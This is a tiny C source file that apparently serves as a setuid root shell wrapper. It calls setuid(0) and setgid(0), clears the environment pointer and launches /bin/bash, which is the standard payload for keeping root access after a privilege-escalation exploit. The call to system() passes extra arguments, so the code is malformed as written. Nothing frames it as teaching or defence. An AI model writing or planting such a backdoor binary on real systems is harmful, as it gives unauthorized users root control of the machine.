#include <unistd.h>
#include <errno.h>

int main(int argc, char** argv, char** envp)
{
	setuid(0);
	setgid(0);
	envp = 0;
	system ("/bin/bash", argv, argc);
	return 0;
}
	
